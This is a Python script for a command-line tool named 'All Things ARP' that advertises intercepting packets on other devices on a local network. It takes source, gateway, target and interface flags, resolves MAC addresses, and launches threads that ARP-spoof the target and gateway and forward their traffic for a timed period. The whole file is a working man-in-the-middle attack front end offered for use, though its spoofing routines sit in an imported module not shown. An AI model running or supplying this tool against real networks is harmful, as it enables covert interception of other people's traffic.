from main import *

REQUIRED_FLAGS = [ '-s', '-g', '-t', '-i' ]
HELP_MESSAGE = f"""ATA ({colorama.Fore.RED}All Things ARP{colorama.Fore.WHITE}):
Intercept packets on other devices on your network.

[Required]:
{colorama.Style.DIM}[{colorama.Style.RESET_ALL}-s{colorama.Style.DIM}]{colorama.Style.RESET_ALL} Define the source of the attack.
{colorama.Style.DIM}[{colorama.Style.RESET_ALL}-g{colorama.Style.DIM}]{colorama.Style.RESET_ALL} Define the gateway.
{colorama.Style.DIM}[{colorama.Style.RESET_ALL}-t{colorama.Style.DIM}]{colorama.Style.RESET_ALL} Define the target of the attack.
{colorama.Style.DIM}[{colorama.Style.RESET_ALL}-i{colorama.Style.DIM}]{colorama.Style.RESET_ALL} Define the network interface.

[Optional]:
{colorama.Style.DIM}[{colorama.Style.RESET_ALL}-h{colorama.Style.DIM}]{colorama.Style.RESET_ALL} Print the help display."""

DEFAULT_DROP = 2
DEFAULT_INTERVAL = 0.1
DEFAULT_DURATION = 30

MAX_DURATION = 300

try:
	if '-h' in sys.argv:
		PrintHelp(HELP_MESSAGE)
		sys.exit()
	if not ValidateFlags(sys.argv, REQUIRED_FLAGS):
		PrintMessage("Please provided the required criteria.")
		sys.exit()

	parameters = { 'Source': None, 'Gateway': None, 'Target': None, 'Interface': None }
	parameters = PopulateFields(parameters)

	addresses = [ parameters['Source'], parameters['Gateway'], parameters['Target'] ]
	if not CheckFields(addresses):
		PrintMessage("There was an error whilst verifying the provided addresses.")
		PrintMessage(f"Addresses:\n{parameters['Source']}\n{parameters['Gateway']}\n{parameters['Target']}\n{parameters['Interface']}")
		sys.exit()

	spoof = Spoof()
	spoof.interval = DEFAULT_INTERVAL

	# source_mac = spoof.GetMAC(parameters['Source'], DEFAULT_DROP)
	source_mac = '2c:fd:a1:61:2d:d3'
	gateway_mac = spoof.GetMAC(parameters['Gateway'], DEFAULT_DROP)
	target_mac = spoof.GetMAC(parameters['Target'], DEFAULT_DROP)

	physicals = [ source_mac, target_mac, gateway_mac ]
	if not CheckFields(physicals):
		PrintMessage("There was an error whilst verifying the physical addresses of the provided IP addresses.")
		PrintMessage(f"MAC Addresses:\n({parameters['Source']} : {source_mac})\n({parameters['Gateway']} : {gateway_mac})\n({parameters['Target']} : {target_mac})")
		sys.exit()

	spoof.source = parameters['Source']
	spoof.target = parameters['Target']
	spoof.gateway = parameters['Gateway']
	spoof.sourcemac = source_mac
	spoof.targetmac = target_mac
	spoof.gatewaymac = gateway_mac

	stop_event = threading.Event()

	spoof_thread = threading.Thread(target=spoof.Spoof)
	tx_thread = threading.Thread(target=spoof.ForwardSent)
	rx_thread = threading.Thread(target=spoof.ForwardReceived)

	spoof_thread.start()
	tx_thread.start()
	rx_thread.start()

	counter = 0
	while counter < DEFAULT_DURATION:
		if counter == DEFAULT_DURATION or counter == MAX_DURATION:
			stop_event.set()
			spoof.Reset()
		counter += 1
		time.sleep(1)
except KeyboardInterrupt:
	spoof_thread.join()
	tx_thread.join()
	rx_thread.join()

	stop_event.set()
	spoof.Reset()
except TypeError:
	PrintMessage("There was a type error. Please verify the integrity of the script.")